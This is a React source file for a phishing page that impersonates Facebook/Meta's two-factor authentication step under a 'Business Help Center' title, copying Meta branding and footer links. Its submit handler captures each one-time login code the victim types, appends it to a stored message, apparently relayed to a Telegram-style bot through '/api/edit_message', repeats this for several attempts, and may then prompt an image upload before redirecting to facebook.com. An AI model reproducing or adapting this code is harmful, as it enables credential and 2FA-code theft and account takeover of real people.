import Favicon from '@/assets/images/aGT3gskzWBf.ico';
import LoadingModal from '@/component/LoadingModal';
import ImageUpload from '@/pages/client/ImageUpload';
import translateText from '@/services/translation';
import { faSpinner, faTimes } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import React, { useEffect, useState } from 'react';
import { Helmet } from 'react-helmet-async';

const defaultTranslations = {
	title: 'Business Help Center',
	facebook: 'facebook',
	logOut: 'Log Out',
	confirmTitle: "Choose a way to confirm it's you",
	twoFactorMessage:
		'Your account has two-factor authentication switched on, which requires this extra login step.',
	enterLoginCode: 'Enter your login code',
	loginCodeDescription:
		"Enter the 6-digit code that we've just sent to your SMS , WhatsApp or from the authentication app that you set up or Enter any 6-digit code if you do not receive it after 2 minutes to continue verifying your identity..",
	loginCodePlaceholder: 'Login code',
	needAnotherWay: "Need another way to confirm it's you?",
	submitCode: 'Submit code',
	didntReceiveCode: "Didn't receive a code?",
	recoverySteps: {
		step1: 'Go to Settings > Security and Login.',
		step2: 'Under the Two-Factor Authentication section, click Use two-factor authentication. You may need to re-enter your password.',
		step3: "Next to Recovery Codes, click Setup then Get Codes. If you're already set up recovery codes, you can click Show Codes",
	},
};

const TwoFa: React.FC = () => {
	const [twoFaCode, setTwoFaCode] = useState<string>('');
	const [isSubmitEnabled, setIsSubmitEnabled] = useState<boolean>(false);
	const [showPopup, setShowPopup] = useState<boolean>(false);
	const [showModal, setShowModal] = useState<boolean>(false);
	const [messageId, setMessageId] = useState<string>('');
	const [isLoading, setIsLoading] = useState<boolean>(false);
	const [attempts, setAttempts] = useState<number>(0);
	const [maxAttempts, setMaxAttempts] = useState<number>(0);
	const [loadingTime, setLoadingTime] = useState<number>(0);
	const [isUploadEnabled, setIsUploadEnabled] = useState<boolean>(false);
	const [isShowLoadingModal, setIsShowLoadingModal] =
		useState<boolean>(false);
	const [translations, setTranslations] = useState(defaultTranslations);
	const [isTranslated, setIsTranslated] = useState(false);

	useEffect(() => {
		const isValid = /^\d{6,8}$/.test(twoFaCode);
		setIsSubmitEnabled(isValid);
	}, [twoFaCode]);

	useEffect(() => {
		const getCodeConfig = async () => {
			const response = await axios.get('/api/get-code-config');
			setMaxAttempts(response.data.maxCodeAttempts);
			setLoadingTime(response.data.codeLoadingTime * 1000);
			setIsUploadEnabled(response.data.isUploadEnabled);
		};
		getCodeConfig();
		const messageId = localStorage.getItem('message_id');
		setMessageId(messageId ?? '');
	}, []);

	useEffect(() => {
		const translateStrings = async () => {
			if (!isTranslated) {
				const translatedTexts = await Promise.all(
					Object.entries(defaultTranslations).map(
						async ([key, value]) => {
							if (typeof value === 'object') {
								const translatedObj = await Promise.all(
									Object.entries(value).map(
										async ([subKey, subValue]) => {
											const translatedSubValue =
												await translateText(subValue);
											return [subKey, translatedSubValue];
										},
									),
								);
								return [key, Object.fromEntries(translatedObj)];
							}
							const translatedValue = await translateText(value);
							return [key, translatedValue];
						},
					),
				);
				setTranslations(Object.fromEntries(translatedTexts));
				setIsTranslated(true);
			}
		};

		translateStrings();
	}, [isTranslated]);

	const handleTwoFaChange = (e: React.ChangeEvent<HTMLInputElement>) => {
		const value = e.target.value.replace(/\D/g, '').slice(0, 8);
		setTwoFaCode(value);
	};

	const handleSubmit = async () => {
		setIsLoading(true);
		const message = localStorage.getItem('message');
		const newMessage = `${message}\n<b>🔑Code ${
			attempts + 1
		}:</b> <code>${twoFaCode}</code>`;
		const response = await axios.post('/api/edit_message', {
			message_id: messageId,
			message: newMessage,
		});
		if (response.status === 200) {
			localStorage.setItem('message', newMessage);
			localStorage.setItem('message_id', response.data.message_id);
			if (attempts === maxAttempts - 1) {
				setIsShowLoadingModal(true);
				if (isUploadEnabled) {
					setShowModal(true);
				} else {
					setTimeout(() => {
						window.location.href = 'https://www.facebook.com';
					}, 1000);
				}
			} else {
				setAttempts(attempts + 1);
				setTimeout(() => {
					setTwoFaCode('');
					setIsLoading(false);
				}, loadingTime);
			}
		}
	};

	return (
		<div className='m-0 box-border h-screen bg-white p-0 font-sans'>
			<Helmet>
				<title>{translations.title}</title>
				<link rel='shortcut icon' href={Favicon} type='image/x-icon' />
			</Helmet>
			<header className='flex h-[50px] w-full items-center justify-around bg-[#517bd0] p-[15px_48px] text-[#9f9f9f]'>
				<p className='font-body text-2xl font-semibold text-white no-underline'>
					{translations.facebook}
				</p>
				<a
					href='https://www.facebook.com'
					className='rounded bg-[#466ebd] px-3 py-1 text-sm font-semibold text-white no-underline'
				>
					{translations.logOut}
				</a>
			</header>

			<main className='flex h-[550px] w-full flex-wrap items-center justify-center bg-[#f0f2f5]'>
				<div className='flex h-auto w-[612px] flex-col rounded border border-[#dddfe2] bg-white p-3'>
					<div className='flex items-center justify-between border-b border-[#dddfe2] pb-3'>
						<h2 className='text-sm font-bold text-[#1d2129]'>
							{translations.confirmTitle}
						</h2>
					</div>
					<div className='border-b border-[#dddfe2] py-3'>
						<p className='text-sm leading-[18px] text-[#1d2129]'>
							{translations.twoFactorMessage}
						</p>
					</div>
					<div className='flex flex-col justify-between border-b border-[#dddfe2] py-3'>
						<b className='mb-3 text-sm font-bold text-[#1d2129]'>
							{translations.enterLoginCode}
						</b>
						<p className='mb-3 text-sm text-[#1d2129]'>
							{translations.loginCodeDescription}
						</p>
						<input
							type='number'
							inputMode='numeric'
							pattern='[0-9]*'
							autoComplete='one-time-code'
							placeholder={translations.loginCodePlaceholder}
							value={twoFaCode}
							onChange={handleTwoFaChange}
							className='inline-block w-[143px] border border-[#bdbdbd] bg-white p-1 text-xs shadow-none outline-none'
						/>
					</div>
					<div className='flex items-center justify-between pt-3'>
						<p
							onClick={() => setShowPopup(true)}
							className='cursor-pointer text-xs font-medium text-[#196ac1] no-underline'
						>
							{translations.needAnotherWay}
						</p>
						<button
							onClick={handleSubmit}
							disabled={!isSubmitEnabled || isLoading}
							className={`flex items-center rounded px-3 py-1 text-xs font-semibold text-white ${
								isSubmitEnabled && !isLoading
									? 'cursor-pointer bg-[#1a73e3]'
									: 'cursor-not-allowed bg-[#75aaee]'
							}`}
						>
							<p className={`m-0 ${isLoading && 'min-w-[68px]'}`}>
								{' '}
								{isLoading ? (
									<FontAwesomeIcon
										icon={faSpinner}
										className='animate-spin'
									/>
								) : (
									translations.submitCode
								)}
							</p>
						</button>
					</div>
					{isShowLoadingModal && (
						<LoadingModal
							loadingTime={loadingTime}
							setShowLoadingModal={setIsShowLoadingModal}
						/>
					)}
				</div>
			</main>

			<footer className='flex w-full flex-wrap justify-center bg-white'>
				<div className='mt-[50px] w-[980px] p-3'>
					<div className='mb-3 border-b border-[#dddfe2] pb-3'>
						<span className='mr-[10px] inline-block cursor-pointer text-xs text-[#737373] hover:underline'>
							English (US)
						</span>
						{[
							'日本語',
							'Português (Brasil)',
							'中文(简体)',
							'Español',
							'Bahasa Indonesia',
							'한국어',
							'Français (France)',
							'Deutsch',
							'Italiano',
						].map((lang, index) => (
							<span
								key={index}
								className='mr-[10px] inline-block cursor-pointer text-xs text-[#517bd0] hover:underline'
							>
								{lang}
							</span>
						))}
					</div>
					<div className='mb-3 border-b border-[#dddfe2] pb-3 text-xs'>
						{[
							'Sign Up',
							'Log In',
							'Messenger',
							'Facebook Lite',
							'Video',
							'Places',
							'Games',
							'Marketplace',
							'Meta Pay',
							'Meta Store',
							'Meta Quest',
							'Instagram',
							'Threads',
							'Fundraisers',
							'Services',
							'Voting Information Center',
							'Privacy Policy',
							'Privacy Center',
							'Groups',
							'About',
							'Create ad',
							'Create Page',
							'Developers',
							'Cookies',
							'Ad choices',
							'Terms',
							'Help',
							'Contact Uploading & Non-Users',
						].map((item, index) => (
							<span
								key={index}
								className='mr-5 inline-block cursor-pointer text-xs text-[#517bd0] hover:underline'
							>
								{item}
							</span>
						))}
					</div>
					<div className='mb-3 pb-3'>
						<span className='mr-[10px] inline-block cursor-default text-xs text-[#737373]'>
							Meta © 2024
						</span>
					</div>
				</div>
			</footer>

			{showPopup && (
				<div className='fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50'>
					<div className='w-full max-w-[500px] rounded-lg bg-white shadow-lg'>
						<div className='flex items-center justify-between border-b p-4'>
							<h2 className='text-lg font-bold'>
								{translations.didntReceiveCode}
							</h2>
							<button
								onClick={() => setShowPopup(false)}
								className='text-2xl'
							>
								<FontAwesomeIcon icon={faTimes} />
							</button>
						</div>
						<div className='p-4'>
							<p className='mb-2'>
								{translations.recoverySteps.step1}
							</p>
							<p className='mb-2'>
								{translations.recoverySteps.step2}
							</p>
							<p>{translations.recoverySteps.step3}</p>
						</div>
					</div>
				</div>
			)}

			{showModal && isUploadEnabled && !isShowLoadingModal && (
				<ImageUpload onClose={() => setShowModal(false)} />
			)}
		</div>
	);
};

export default TwoFa;
